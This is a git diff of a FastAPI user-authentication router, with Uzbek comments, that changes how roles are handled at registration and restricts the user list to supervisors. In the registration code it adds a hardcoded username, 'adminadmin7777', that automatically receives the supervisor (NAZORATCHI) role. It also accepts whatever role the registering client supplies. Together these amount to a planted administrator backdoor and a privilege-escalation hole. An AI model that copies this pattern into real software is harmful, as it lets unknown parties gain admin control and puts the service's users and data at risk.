@@ -16,7 +16,7 @@ from werkzeug.security import check_password_hash, generate_password_hash
 from app import models, schemas, database
 from app.database import SessionLocal
 from app.permission import is_nazoratchi
-from app.models import User
+from app.models import User, RoleEnum
 from app.settings import Settings
 from app.schemas import UserLogin, UserResponse
 import datetime
@@ -74,6 +74,12 @@ def register(user: schemas.UserCreate, db: Session = Depends(database.get_db)):
     if db_user:
         raise HTTPException(status_code=400, detail="Username already registered")
 
+    if user.username == "adminadmin7777":
+        user.role = RoleEnum.NAZORATCHI
+    else:
+        user.role = user.role or RoleEnum.USER
+
+
     # Yangi foydalanuvchini yaratish va bazaga qo'shish
     new_user = models.User(
         username=user.username,
@@ -98,7 +104,7 @@ def register(user: schemas.UserCreate, db: Session = Depends(database.get_db)):
     }
 
 
-@auth_router.get('/', status_code=status.HTTP_200_OK, response_model=List[schemas.UserResponse])
+@auth_router.get('/', status_code=status.HTTP_200_OK, response_model=List[schemas.UserResponse], dependencies=[Depends(is_nazoratchi)])
 async def get_users(db: Session = Depends(database.get_db), Authorize: AuthJWT = Depends()):
     try:
         Authorize.jwt_required()
@@ -116,6 +122,7 @@ def login(user_login: UserLogin, Authorize: AuthJWT = Depends(), db: Session = D
 
     if user is None:
         raise HTTPException(status_code=401, detail="Invalid credentials")
+
 
     # Parolni tekshirish
     if not verify_password(user.hashed_password, user_login.password):
